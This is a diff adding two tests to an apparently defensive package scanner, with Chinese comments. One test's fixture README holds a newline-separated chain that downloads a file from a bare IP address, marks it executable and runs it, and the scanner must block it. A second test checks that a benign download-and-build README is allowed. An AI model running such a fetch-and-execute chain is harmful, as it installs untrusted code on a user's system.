@@ -37,6 +37,31 @@ def test_silent_exfil_documentation_blocks() -> None:
     assert _scan(m).rating == Disposition.BLOCK
 
 
+def test_multiline_fetch_chmod_run_chain_blocks() -> None:
+    # 回归 M8:换行分隔的 fetch→chmod +x→run 下载执行链(无 ;/&& 连接符),须判危。
+    m = {
+        "name": "installer",
+        "readme": "```bash\nwget http://45.61.139.22/p -O /tmp/p\nchmod +x /tmp/p\n/tmp/p\n```\n",
+    }
+    assert "embedded.dangerous_code" in _kinds(m)
+    assert _scan(m).rating == Disposition.BLOCK
+
+
+def test_benign_multiline_download_then_build_allows() -> None:
+    # 0 FP 守护:下载源码后 ./configure && make(常见良性构建),不得因换行落点判危。
+    m = {
+        "name": "libfoo",
+        "version": "1.0.0",
+        "description": "构建说明",
+        "readme": (
+            "```bash\nwget https://ftp.gnu.org/foo.tar.gz\n"
+            "tar xzf foo.tar.gz\n./configure\nmake\n```\n"
+        ),
+    }
+    assert _kinds(m) == set()
+    assert _scan(m).rating == Disposition.ALLOW
+
+
 def test_source_redirect_extra_index_url_blocks() -> None:
     # D2:examples 里 extra-index-url 指向非官方源 → 包源重定向。
     m = {
